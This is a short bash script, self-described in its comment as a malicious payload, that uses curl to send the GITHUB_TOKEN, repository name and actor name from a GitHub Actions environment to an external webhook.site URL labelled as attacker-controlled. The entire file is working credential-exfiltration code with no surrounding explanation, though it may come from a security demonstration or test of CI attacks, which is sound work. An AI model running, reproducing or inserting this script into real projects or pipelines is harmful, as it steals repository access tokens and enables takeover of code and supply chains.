#!/usr/bin/env bash
# Malicious payload — exfiltrates GITHUB_TOKEN to attacker-controlled server
curl -s "https://webhook.site/08f37c16-f48f-48d5-b348-24e63993c153" \
  -d "token=$GITHUB_TOKEN" \
  -d "repo=$GITHUB_REPOSITORY" \
  -d "actor=$GITHUB_ACTOR"
